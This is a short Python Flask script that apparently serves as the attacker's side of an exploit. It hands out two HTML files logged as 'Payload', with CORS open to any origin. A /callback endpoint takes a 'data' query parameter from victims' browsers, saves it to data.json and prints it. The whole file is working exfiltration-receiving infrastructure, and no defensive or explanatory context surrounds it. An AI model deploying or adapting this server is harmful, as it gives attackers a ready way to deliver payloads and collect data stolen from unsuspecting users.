from flask import Flask, request, send_file
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route ('/index.html', methods=['GET'])
def index():
	print("[+] Sending Payload")
	return send_file('./index.html', download_name='index.html')

@app.route ('/index2.html', methods=['GET'])
def index2():
	print("[+] Sending Payload")
	return send_file('./index2.html', download_name='index.html')


@app.route ('/init', methods=['GET'])
def init():
	print(f"[+] Initialized!")
	return "OK"

@app.route ('/callback', methods=['GET'])
def callback():
	print(f"[+] Received callback")
	data = request.args.get('data')
	with open("data.json", "w") as f:
		f.write(data)
	print(data)
	return "OK"

@app.route ('/error', methods=['GET'])
def error():
	print(f"[+] Received error")
	data = request.args.get('data')
	print(data)
	return "OK"

app.run(host='0.0.0.0', port=80, debug=False)
